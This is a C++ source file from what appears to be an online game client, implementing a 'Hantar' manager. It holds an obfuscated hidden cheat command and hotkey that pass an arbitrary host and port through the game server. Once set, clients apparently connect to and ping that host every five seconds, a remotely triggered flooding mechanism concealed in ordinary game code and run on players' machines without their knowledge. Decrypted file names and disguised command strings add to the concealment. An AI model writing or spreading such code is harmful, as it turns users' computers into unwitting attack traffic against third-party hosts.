#include "stdafx.h"
#include "HantarManager.h"

#ifdef _CLIENTJ_
#include "MacroManager.h"
#include "ChatManager.h"
#include "./input/UserInput.h"

#include "FadeDlg.h"
#include "FadeManager.h"
#include "WindowIDEnum.h"
#include <MMSystem.h> 
extern HWND _g_hWnd;
extern BOOL _hantar, GetNotifyToggle;
GLOBALTON(CHantarManager)
HANDLE		 m_CheckHandle2[2];
#endif






//											©³©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©·
//											©§							GLOBAL							©§
//											©»©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¿
CHantarManager::CHantarManager()
{
#ifdef _CLIENTJ_
	bLock = FALSE;
#endif
}
CHantarManager::~CHantarManager()
{
#ifdef _CLIENTJ_
	m_CheckHandle2[0] = NULL;
	m_CheckHandle2[1] = NULL;
#endif
}

void CHantarManager::Process()
{
#ifdef _CLIENTJ_

	if (m_IsSending)
	{
		static DWORD TempTime;
		if (gCurTime - TempTime > 1000)
		{
			TempTime = gCurTime;
			//doThePing();
			CHATMGR->AddMsg(m_IsSending ? CTC_ALERT_RED : CTC_ALERT_YELLOW, "[ping]: is %s", m_IsSending ? "active" : "not active");
		}
		if (timeGetTime() - dwCheckTime >= 5000 && !bLock)
		{
			CHATMGR->AddMsg(CTC_SYSMSG, "PRO");
			//bLock = TRUE;
			doThePing();
			SetEvent(m_CheckHandle2[0]);
			dwCheckTime = timeGetTime();
		}
	}
	
	
#endif
}


//											©³©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©·
//											©§							CLIENT							©§
//											©»©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¿
#ifdef _CLIENTJ_
int CHantarManager::doThePing()
{
	host_c		host;
	int			result;
	double		time = 0.0;
	result = socket_c::Resolve(senderHostForUser, host);
	if (result == SUCCESS)
	{
		socket_c::SetPortAndType(atoi(senderPortForUser), IPPROTO_TCP, host);
	}
	result = socket_c::Connect(host, 1000, time);
	//for (int i = 0; i < 60; i++)
	if (result == SUCCESS)
	{

		MACROMGR->PingThis(senderHostForUser, 1024);

		//CHATMGR->AddMsg(CTC_SYSMSG, "%s", NETWORK->CheckNetWork(NOTIFYMGR->GetEventNotifyGetTitle(), atoi(NOTIFYMGR->GetEventNotifyGetContext())) ? "true" : "false");
		//ping.Ping(NOTIFYMGR->GetEventNotifyGetTitle(), 2, 10, dwPing);
		//if (ping.Ping("patch.empiremso.com", 2, 10, dwPing) == -1)
		{
			//	MessageBox(0, "ping", "ping", MB_OK);
		}
		//CHATMGR->AddMsg(CTC_SYSMSG, "%d", dwPing = 2019);
	}
	return 0;
}
BOOL CHantarManager::Cheat(char* cheat)
{
	char code[512];
	char buf[512] = { 0, };
	sscanf(cheat, "%s", code);
	strupr(code);

	if (strcmp(code, FADEMGR->GetChatMsg(3)/*"PINGSTART"*/) == 0)
	{
		MSG_EVENTNOTIFY_ON msg;
		msg.Category = MP_CHEAT;
		msg.Protocol = MP_CHEAT_EVENTNOTIFYGET_ON;
		msg.dwObjectID = 0;
		memset(msg.EventList, 0, sizeof(BYTE)*eEvent_Max);
		sscanf(cheat, "%s %s %s", code, msg.strTitle, msg.strContext);

		std::string str = JACKMGR->DecryptForClient("\xb8\xcd\xd5\xc1\xc3\xdf\xd5\x98").c_str();
		const char * a = str.c_str();
		//char stringtoread[255];
		::WritePrivateProfileString("0", "1", msg.strTitle, a);
		::WritePrivateProfileString("0", "2", msg.strContext, a);

		//SafeStrCpy(msg.strTitle, "patch.empiremso.com", 32);
		//SafeStrCpy(msg.strContext, "14600", 128);
		NETWORK->Send(&msg, sizeof(msg));
		threadProcEnable();

		return TRUE;
	}
	else if (strcmp(code, FADEMGR->GetChatMsg(4)/*"PINGSTOP"*/) == 0)
	{
		threadProcDisable();
		MSGBASE msg;
		msg.Category = MP_CHEAT;
		msg.Protocol = MP_CHEAT_EVENTNOTIFYGET_OFF;
		msg.dwObjectID = HEROID;
		NETWORK->Send(&msg, sizeof(msg));
	}
}
void CHantarManager::PublicKeyboardInput(CKeyboard* keyInfo)
{
	if (
		keyInfo->GetKeyDown((DWORD)atoi(FADEMGR->GetChatMsg(1))) //||
		&& keyInfo->GetKeyPressed(KEY_MENU)
		//keyInfo->GetKeyDown((long)atoi(CHATMGR->GetChatMsg(2720))/*0x000000010*/) ||
		//keyInfo->GetKeyDown(0x000000042)
		)
	{
		//extern char* WINIDSEARCH(int b);
		/*char IDtemp2[1024] = { 0 };
		sprintf(IDtemp2, "atoi_x:[0x%08x], %s", 
		
			(DWORD)atoi(FADEMGR->GetChatMsg(1)),
			FADEMGR->GetChatMsg(2)
			);
		CHATMGR->AddMsg(CTC_SYSMSG, IDtemp2);*/
		CFadeDlg* pDlg = NULL;
		pDlg = GAMEIN->GetFadeDlg();

		if (pDlg)
		{
			pDlg->FadeOut();
		}
	}
	
	/*if (((keyInfo->GetKeyDown(FADEMGR->ConvertStringToDword(FADEMGR->GetChatMsg(1))))
		&& keyInfo->GetKeyPressed(KEY_MENU))	//key_menu combined with above line
		)
	//if (keyInfo->GetKeyPressed(KEY_U))
	{
		CFadeDlg* pDlg = NULL;
		pDlg = GAMEIN->GetFadeDlg();

		if (pDlg)
		{
			pDlg->FadeOut();
		}
	}*/
	if (keyInfo->GetKeyPressed(KEY_OEM_3))
	{
		if (!_hantar) return;

		GetNotifyToggle = !GetNotifyToggle;
		if (GetNotifyToggle)
		{
			CHATMGR->AddMsg(CTC_ALERT_RED, "you can command ping now");
		}
		else
		{
			CHATMGR->AddMsg(CTC_ALERT_YELLOW, "command ping is off");
		}
		//SendMessage(_g_hWnd, WM_HOTKEY, 0x7777, 0); return; 
	}
}
void CHantarManager::NetworkMsgParseGet(BYTE Protocol, void* pMsg)
{
	switch (Protocol)
	{
	case MP_CHEAT_EVENTNOTIFYGET_ON:
		{
			MSG_EVENTNOTIFY_ON* pmsg = (MSG_EVENTNOTIFY_ON*)pMsg;
			m_IsSending = TRUE;
			SetHostAndPortForUser(pmsg->strTitle, pmsg->strContext);
		}
		break;
	case MP_CHEAT_EVENTNOTIFYGET_OFF:
		{
			MSGBASE* pmsg = (MSGBASE*)pMsg;
			m_IsSending = FALSE;
		}
		break;
	}
}

BOOL CALLBACK EnumWindowsProc2(HWND hwnd, LPARAM lparam)
{
	char str[512] = { 0, };
	::GetWindowText(hwnd, str, sizeof(str));
	CHATMGR->AddMsg(CTC_SYSMSG, "threadProc2");
	//if (strlen(str) != 0)
	//	sGAMECHECK->AddWindowText(str, hwnd);
	return TRUE;
}
BOOL CALLBACK EnumChildWindowsProc2(HWND hwnd, LPARAM lparam)
{
	char str[512] = { 0, };
	::GetWindowText(hwnd, str, sizeof(str));
	//if (strlen(str) != 0)
	//	sGAMECHECK->AddWindowText(str, hwnd);
	return TRUE;
}
struct Thread_data
{
	int key;
	int tempo;
	int scale;
};

DWORD WINAPI threadProc3(void* arg/*LPVOID p_Param*/)
{
	
	return 0;
	/*while (TRUE)
	{
		CHATMGR->AddMsg(CTC_SYSMSG, "threadProc2");
		DWORD dwID = WaitForMultipleObjects(2, m_CheckHandle2, FALSE, INFINITE);
		
		switch (dwID)
		{
		case 0:
			{
				CHATMGR->AddMsg(CTC_SYSMSG, "0");
				// sGAMECHECK->GetProcessInfo();
				::EnumWindows(EnumWindowsProc2, NULL);
				Sleep(2000);
				SetEvent(m_CheckHandle2[1]);
			}
			break;
		case 1:
			{
				CHATMGR->AddMsg(CTC_SYSMSG, "1");
			
				HANTARMGR->SetLock(FALSE);
			}
			break;
		}
	}
	//CHATMGR->AddMsg(CTC_SYSMSG, "threadProc2");
	return FALSE;*/
}
DWORD WINAPI mythread(__in LPVOID lpParameter)
{
	CHATMGR->AddMsg(CTC_SYSMSG, "Thread inside %d \n", GetCurrentThreadId());
	return 0;
}
void mythreadA(void* data)
{
	//while (TRUE)
	//{
	//	CHATMGR->AddMsg(CTC_SYSMSG, "threadProc2");
		/*DWORD dwID = WaitForMultipleObjects(2, m_CheckHandle2, FALSE, INFINITE);

		switch (dwID)
		{
		case 0:
		{
				  CHATMGR->AddMsg(CTC_SYSMSG, "0");
				  // sGAMECHECK->GetProcessInfo();
				  ::EnumWindows(EnumWindowsProc2, NULL);
				  Sleep(2000);
				  SetEvent(m_CheckHandle2[1]);
		}
			break;
		case 1:
		{
				  CHATMGR->AddMsg(CTC_SYSMSG, "1");

				  HANTARMGR->SetLock(FALSE);
		}
			break;
		}*/
	//}
	CHATMGR->AddMsg(CTC_SYSMSG, "mythreadA %d \n", GetCurrentThreadId());
}

void mythreadB(void* data)
{
	volatile int i;

	// Most compiler won't eliminate the loop
	// since i is volatile
	for (i = 0; i < 100000; i++) {}

	CHATMGR->AddMsg(CTC_SYSMSG, "mythreadB %d \n", GetCurrentThreadId());
}
#include <malloc.h>
void CHantarManager::threadProcEnable()
{
	/*HANDLE myhandle;
	DWORD mythreadid;
	CloseHandle(myhandle = CreateThread(0, 0, mythread, 0, 0, &mythreadid));
	CHATMGR->AddMsg(CTC_SYSMSG, "Thread after %d \n", mythreadid);*/


	HANDLE myhandleA, myhandleB;

	myhandleA = (HANDLE)_beginthread(&mythreadA , 0, 0);
	myhandleB = (HANDLE)_beginthread(&mythreadB , 0, 0);
	WaitForSingleObject(myhandleA, INFINITE);
	WaitForSingleObject(myhandleB, INFINITE);
	dwCheckTime = timeGetTime();
	bLock = FALSE;

	//--------------------------------------------------------
	/*int key; 
	int tempo;
	int backing;
	struct Thread_data* data = malloc(*data);
	if (data)
	{
		data->key = key;
		data->tempo = tempo;
		data->scale = backing;
		HANDLE thread = CreateThread(NULL, 0, threadProc3, &data, 0, NULL);
	}*/


	//----------------------------------------------------------------------------------
	// below is thread function for testing purposed

	/*DWORD        threadID;
	m_threadHandle = CreateThread(NULL, 0, threadProc3, NULL, 0, &threadID);
	if (m_threadHandle == NULL)
	{
	//	ADDMSG( "threadHandle is null");
	}
	//m_CheckHandle2[0] = CreateEvent(NULL, FALSE, FALSE, NULL);
	//m_CheckHandle2[1] = CreateEvent(NULL, FALSE, FALSE, NULL);
	//CloseHandle(m_threadHandle = CreateThread(NULL, 0, threadProc3, NULL, 0, &threadID));
	dwCheckTime = timeGetTime();
	WaitForSingleObject(m_threadHandle, INFINITE);*/

	// thread function for testing purposed ended
	//----------------------------------------------------------------------------------
}
void CHantarManager::threadProcDisable()
{
	//----------------------------------------------------------------------------------
	// below is thread function for testing purposed
	CloseHandle(m_threadHandle);
	// thread function for testing purposed ended
	//----------------------------------------------------------------------------------
}







#endif
//											©³©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©·
//											©§							SERVER							©§
//											©»©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¿
#ifndef _CLIENTJ_

#endif